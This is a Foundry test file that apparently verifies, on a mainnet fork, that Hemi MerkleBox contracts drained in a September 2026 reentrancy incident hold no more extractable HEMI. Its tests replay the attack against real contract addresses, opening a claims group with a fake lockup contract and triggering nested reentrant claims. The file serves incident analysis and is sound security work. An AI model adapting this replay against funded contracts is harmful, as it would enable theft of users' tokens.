// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20, IMerkleBox, HemiFakeLockup} from "../src/C34.sol";

/// @title C-34 Hemi MerkleBox live-extractability PoC
/// @notice Read-only fork tests. No mainnet transactions are ever sent.
/// Incident: 2026-09-07, 124.5M unclaimed HEMI (~$255K realised) drained from the immutable
/// Genesis Drop MerkleBox via lockup-before-accounting reentrancy with an attacker-supplied
/// lockup contract. This suite proves the remaining extractable value today is $0: whatever the
/// attacker deposits is the ceiling of what any claim/reentrancy attempt can return.
contract HemiC34Test is Test {
    address constant MB1 = 0x9Ab3660ceE733332785cEa09D1a4Ff222F31aE54; // Genesis Drop MerkleBox
    address constant MB2 = 0x112de51b708c77C628532120Ffe2c0200f067399; // second MerkleBox deployment
    address constant HEMI = 0x99e3dE3817F6081B2568208337ef83295b7f591D;

    function _rpc() internal view returns (string memory) {
        return vm.envOr("HEMI_RPC_URL", string("https://rpc.hemi.network/rpc"));
    }

    function setupFork(string memory rpc) external {
        vm.createSelectFork(rpc);
    }

    function test_hemi_live_balances_are_zero() public {
        try this.setupFork(_rpc()) {} catch {
            vm.skip(true);
        }
        assertEq(IERC20(HEMI).balanceOf(MB1), 0, "MB1 still holds HEMI");
        assertEq(IERC20(HEMI).balanceOf(MB2), 0, "MB2 still holds HEMI");
        assertEq(address(MB1).balance, 0, "MB1 has native balance");

        // Attacker groups 15 and 16 (from the post-mortem) are empty.
        (, , uint256 bal15, , , , , , , , , ) = IMerkleBox(MB1).holdings(15);
        (, , uint256 bal16, , , , , , , , , ) = IMerkleBox(MB1).holdings(16);
        assertEq(bal15, 0, "holding 15 still funded");
        assertEq(bal16, 0, "holding 16 still funded");
    }

    function _openGroup(uint256 amount, HemiFakeLockup fake, bytes32 leaf) internal returns (uint256) {
        IMerkleBox.MonthBonusInfo[] memory bonuses = new IMerkleBox.MonthBonusInfo[](1);
        // 1-month lockup with a 50% minimum lock ratio so both the locked and liquid legs are > 0.
        bonuses[0] = IMerkleBox.MonthBonusInfo({months: 1, bonus: 0, minLockupRatio: 5_000, nft: address(0)});
        IERC20(HEMI).approve(MB1, amount);
        return IMerkleBox(MB1).newClaimsGroup(
            HEMI,
            amount,
            leaf,
            block.timestamp + 31 days,
            "c34-live-check",
            true, // onlySelfCanClaim
            true,
            bonuses,
            address(fake),
            false,
            bytes32(0)
        );
    }

    /// @notice Round-trip today: the MerkleBox holds nothing but the attacker's own deposit.
    function test_hemi_claim_roundtrips_zero_profit() public {
        try this.setupFork(_rpc()) {} catch {
            vm.skip(true);
        }
        uint256 amount = 2_000_000e18;
        deal(HEMI, address(this), amount);
        uint256 deposited = IERC20(HEMI).balanceOf(address(this));

        HemiFakeLockup fake = new HemiFakeLockup();
        fake.configure(MB1, HEMI, 0); // no recursion: clean round trip

        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(address(fake), amount))));
        bytes32[] memory proof = new bytes32[](0);
        uint256 gid = _openGroup(amount, fake, leaf);
        fake.setClaim(gid, proof, 1, 5_000);

        try fake.attack(amount) {} catch (bytes memory reason) {
            emit log_named_bytes("claim reverted", reason);
        }

        // Ceiling: whatever the attacker deposited is all they can ever hold.
        uint256 attackerHeld = IERC20(HEMI).balanceOf(address(this)) + IERC20(HEMI).balanceOf(address(fake));
        assertLe(attackerHeld, deposited, "attacker extracted more than deposited");
        assertLe(IERC20(HEMI).balanceOf(MB1), deposited, "MB1 holds more than the deposit");
        emit log_named_uint("attacker held after", attackerHeld);
        emit log_named_uint("MB1 HEMI after", IERC20(HEMI).balanceOf(MB1));
    }

    /// @notice Reentrancy replay (3 nested claims, as the real attack used 63). With a zero HEMI
    /// balance the nested pulls either round-trip the attacker's own capital or revert on the empty
    /// balance; the attacker cannot end with more than the deposit.
    function test_hemi_reentrancy_extracts_zero_profit() public {
        try this.setupFork(_rpc()) {} catch {
            vm.skip(true);
        }
        uint256 amount = 2_000_000e18;
        deal(HEMI, address(this), amount);
        uint256 deposited = IERC20(HEMI).balanceOf(address(this));

        HemiFakeLockup fake = new HemiFakeLockup();
        fake.configure(MB1, HEMI, 3); // recurse 3x

        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(address(fake), amount))));
        bytes32[] memory proof = new bytes32[](0);
        uint256 gid = _openGroup(amount, fake, leaf);
        fake.setClaim(gid, proof, 1, 5_000);

        try fake.attack(amount) {} catch (bytes memory reason) {
            emit log_named_bytes("reentrant claim reverted", reason);
        }

        uint256 attackerHeld = IERC20(HEMI).balanceOf(address(this)) + IERC20(HEMI).balanceOf(address(fake));
        assertLe(attackerHeld, deposited, "attacker extracted more than deposited");
        assertLe(IERC20(HEMI).balanceOf(MB1), deposited, "MB1 holds more than the deposit");
        emit log_named_uint("attacker held after", attackerHeld);
        emit log_named_uint("MB1 HEMI after", IERC20(HEMI).balanceOf(MB1));
    }
}
